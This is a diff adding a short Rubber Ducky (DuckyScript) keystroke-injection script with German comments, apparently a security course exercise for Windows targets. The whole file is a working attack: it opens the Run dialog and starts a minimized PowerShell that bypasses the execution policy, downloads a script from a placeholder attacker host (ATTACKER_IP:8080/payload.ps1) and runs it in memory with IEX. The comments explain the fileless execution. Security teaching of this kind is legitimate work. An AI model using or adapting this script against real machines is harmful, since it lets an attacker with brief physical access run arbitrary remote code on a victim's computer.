@@ -1,0 +1,25 @@
+REM ============================================================
+REM  W02a.4 – Rubber Ducky: Externes Script laden und ausführen
+REM  Autoren: Raphael Bleier, Joachim Lugger
+REM  Ziel-OS: Windows
+REM  Beschreibung: Lädt ein PowerShell-Script vom Webserver
+REM                des Angreifers herunter und führt es aus.
+REM
+REM  Voraussetzung: Python-Server läuft auf ATTACKER_IP:8080
+REM                 und hostet das Script unter /payload.ps1
+REM  Ersetze ATTACKER_IP mit der echten IP-Adresse!
+REM ============================================================
+
+DELAY 2000
+
+REM Run-Dialog öffnen
+GUI r
+DELAY 500
+
+REM PowerShell minimiert starten, ExecutionPolicy umgehen,
+REM Script vom Webserver herunterladen und direkt ausführen (IEX)
+STRINGLN powershell -WindowStyle Minimized -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/payload.ps1')"
+DELAY 5000
+
+REM Hinweis: IEX = Invoke-Expression – führt den heruntergeladenen
+REM          String direkt als PowerShell-Code aus (kein Datei-Touch)
